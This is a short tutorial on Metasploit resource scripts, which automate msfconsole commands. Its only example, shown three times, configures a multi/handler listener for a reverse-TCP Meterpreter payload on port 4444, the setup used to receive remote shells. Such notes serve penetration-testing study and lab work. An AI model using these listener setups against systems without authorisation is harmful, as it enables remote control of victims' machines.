# Automating

## Overview

Metasploit resource scripts are a useful feature that let you automate repetitive tasks and commands inside `msfconsole`. They work like batch scripts, allowing you to define a sequence of commands and run them automatically in order.

This is especially useful when you want to repeat the same setup over and over, such as starting a handler, configuring payload settings, or running a series of Metasploit commands without typing them manually each time.

## What Resource Scripts Do

Resource scripts let you:

- Automate repeated `msfconsole` commands.
- Run commands sequentially.
- Save time during testing and exploitation.
- Standardize common tasks.
- Reduce manual errors.

They are commonly used for:

- Setting up a `multi/handler`.
- Loading and executing payloads.
- Configuring options automatically.
- Running a predefined Metasploit workflow.

## Basic Idea

A resource script is just a text file containing `msfconsole` commands. When the script is loaded, Metasploit executes each command in order.

### Example Structure

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
run
```

## How It Works

Instead of typing the same commands manually, you place them in a file and load that file into `msfconsole`. Metasploit then runs the commands one after another.

### Example Resource File

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
run
```

### Load the Script

Inside `msfconsole`, use:

```bash
resource script.rc
```

If the file is valid, Metasploit executes all commands inside it automatically.

## Common Uses

### Multi/Handler Setup

A resource script is useful when you need a listener ready before launching a payload.

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
run
```

### Repeated Workflows

You can also use resource scripts to automate other repeated tasks, such as:

- Selecting a workspace.
- Checking the database status.
- Loading a plugin.
- Running a module.
- Saving output.

## Why This Matters

Resource scripts are valuable because they make Metasploit faster and more efficient to use. They are especially helpful when you need to repeat the same commands during labs, demonstrations, or real assessments.

## Key Idea

Metasploit resource scripts automate `msfconsole` by running a list of commands in sequence. They are a simple but powerful way to save time and reduce repetition.
